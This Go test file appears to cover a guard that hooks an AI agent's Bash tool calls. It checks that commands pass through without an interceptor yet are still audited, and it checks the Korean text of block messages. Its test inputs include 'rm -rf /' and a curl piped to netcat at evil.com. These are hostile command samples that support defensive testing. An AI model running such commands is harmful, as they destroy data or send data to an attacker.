package guard

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

// Both model-facing tool results and audit records must identify platform policy.
func TestSystemBlockMessageKorean(t *testing.T) {
	got := systemBlockMessage("사용자 거부")
	want := "[ARTEX 플랫폼 정책 · 대상 시스템의 방어가 아님] 이 도구 호출은 실행 전에 차단되어 실행되지 않았습니다. 이유: 사용자 거부. 차단 범위는 적용된 규칙에 한정됩니다."
	if got != want {
		t.Fatalf("platform policy framing lost: %q", got)
	}
}

func TestSystemBlockMessageLocalizesOnlyLeadingModelMarker(t *testing.T) {
	for _, tc := range []struct{ reason, want string }{
		{"[模型] 금지된 작업", "[모델] 금지된 작업"},
		{"[模型]금지된 작업", "[모델]금지된 작업"},
		{"[모델] 금지된 작업", "[모델] 금지된 작업"},
		{"사용자가 입력한 [模型] 표기", "사용자가 입력한 [模型] 표기"},
	} {
		if got := systemBlockMessage(tc.reason); !strings.Contains(got, "이유: "+tc.want+". 차단 범위는 적용된 규칙에 한정됩니다.") {
			t.Errorf("reason %q: unexpected display %q", tc.reason, got)
		}
	}
}

var _ = hook.PreToolUse
